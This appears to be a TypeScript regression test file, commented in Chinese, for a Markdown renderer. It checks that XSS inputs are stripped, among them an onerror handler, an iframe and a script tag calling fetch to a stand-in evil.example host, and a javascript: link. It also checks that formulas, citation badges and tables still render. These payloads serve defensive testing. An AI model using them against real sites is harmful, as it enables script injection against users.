// 批次二 R7-1 回归:Markdown 渲染管线必须消毒不可信内容(消息正文/翻译块/跨端导入的
// 会话都经此渲染),同时不得破坏公式、citation 徽章、表格等既有能力。
// 用 react-dom/server 静态渲染真实组件(真实 Streamdown 管线:raw → sanitize → harden
// → KaTeX),对产物 HTML 断言。
import { describe, expect, test } from "bun:test";
import * as React from "react";
import { renderToStaticMarkup } from "react-dom/server";

import Markdown from "./markdown";
import { TooltipProvider } from "~/components/ui/tooltip";

// 同 markdown-streaming.test:代码块复制按钮的 Tooltip 需要 Provider。
function render(content: string): string {
  return renderToStaticMarkup(
    React.createElement(TooltipProvider, null, React.createElement(Markdown, { content })),
  );
}

describe("Markdown 消毒(R7-1)", () => {
  test("img onerror 事件处理器被剥除", () => {
    const html = render(`before <img src="x" onerror="alert(1)"> after`);
    expect(html).not.toContain("onerror");
    expect(html).toContain("before");
    expect(html).toContain("after");
  });

  test("iframe 整体被剥除", () => {
    const html = render(`hello <iframe src="https://evil.example/"></iframe> world`);
    expect(html).not.toContain("<iframe");
    expect(html).not.toContain("evil.example");
  });

  test("script 标签被剥除", () => {
    const html = render(`text <script>fetch("https://evil.example/x")</script> tail`);
    expect(html).not.toContain("<script");
    expect(html).not.toContain("evil.example");
  });

  test("javascript: 链接协议被消毒", () => {
    const html = render(`[click me](javascript:alert(1))`);
    expect(html).not.toContain("javascript:");
    expect(html).toContain("click me");
  });

  test("安全的原始 HTML 子集仍然放行(sub/sup)", () => {
    // Streamdown 的自定义组件会给 sub/sup 附加 class/data 属性,只断言标签本身。
    const html = render(`H<sub>2</sub>O 与 x<sup>2</sup>`);
    expect(html).toContain("<sub");
    expect(html).toContain("<sup");
  });
});

describe("Markdown 能力回归(消毒不误伤)", () => {
  test("行内公式 $..$ 渲染为 KaTeX", () => {
    const html = render(`能量公式 $E=mc^2$ 成立`);
    expect(html).toContain("katex");
    expect(html).toContain("mc");
  });

  test("多行块级公式 $$..$$ 以 display 模式渲染", () => {
    const html = render(`$$\n\\int_0^1 x^2 dx\n$$`);
    expect(html).toContain("katex-display");
  });

  test("\\(..\\) 与 \\[..\\] 语法经预处理后同样渲染", () => {
    const inline = render(`爱因斯坦说 \\(E=mc^2\\)`);
    expect(inline).toContain("katex");
    // \[..\] 经 preProcess 压成单行 $$..$$,remark-math 按 text math 解析(新旧管线一致)。
    const block = render(`\\[\\sum_{i=1}^n i\\]`);
    expect(block).toContain("katex");
  });

  test("citation 徽章仍然渲染", () => {
    const html = render(`结论成立 [citation,example.com](42)`);
    expect(html).toContain("citation-badge");
  });

  test("GFM 表格仍然渲染", () => {
    const html = render(`| A | B |\n| - | - |\n| 1 | 2 |`);
    expect(html).toContain("<table");
    expect(html).toContain("<td");
  });

  test("行内代码与普通链接仍然渲染", () => {
    const html = render("使用 `bun test` 运行,详见 [文档](https://example.com/docs)");
    expect(html).toContain("inline-code");
    expect(html).toContain(`href="https://example.com/docs"`);
  });
});
